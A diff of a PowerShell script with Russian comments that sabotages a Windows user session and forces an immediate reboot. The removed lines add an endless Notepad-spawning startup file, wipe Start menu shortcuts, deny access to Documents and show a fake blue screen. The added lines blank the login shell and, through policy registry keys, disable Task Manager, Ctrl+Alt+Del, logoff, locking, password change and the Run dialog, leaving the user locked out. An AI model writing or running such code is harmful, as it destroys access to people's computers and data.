@@ -1,36 +1,15 @@
-# 1. Отключение рабочего стола
-Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" "Shell" "notepad.exe"
+# Полностью пустой Shell — ничего не запустится после входа
+Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name Shell -Value ""
 
-# 2. Бесконечный запуск Блокнота при старте
-$batPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\breaker.bat"
-$batCode = '@echo off
-:loop
-start notepad
-goto loop'
-Set-Content -Path $batPath -Value $batCode -Encoding ASCII
+# Отключение всего Ctrl + Alt + Del
+Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name DisableTaskMgr -Value 1
+Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name DisableChangePassword -Value 1
+Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name DisableLockWorkstation -Value 1
+Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name DisableLogoff -Value 1
+Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name DisableCAD -Value 1
 
-# 3. Очистка Пуск
-Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\*" -Recurse -Force -ErrorAction SilentlyContinue
+# Блокировка Win + R (Выполнить)
+Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name NoRun -Value 1
 
-# 4. Блокировка Documents
-icacls "$env:USERPROFILE\Documents" /deny "$env:USERNAME":(OI)(CI)F
-
-# 5. Фейковый BSOD
-Add-Type -AssemblyName PresentationFramework
-$bsod = New-Object -TypeName Window -Property @{
-    WindowStyle = 'None'
-    ResizeMode = 'NoResize'
-    Background = 'DarkBlue'
-    WindowStartupLocation = 'CenterScreen'
-    Topmost = $true
-    Width = [System.Windows.SystemParameters]::PrimaryScreenWidth
-    Height = [System.Windows.SystemParameters]::PrimaryScreenHeight
-    Content = ":(
-
-Your PC ran into a problem and needs to restart.
-Stop code: FAKE_BSOD"
-}
-$bsod.ShowDialog()
-
-# 6. Ребут
+# Ребут
 shutdown /r /t 0
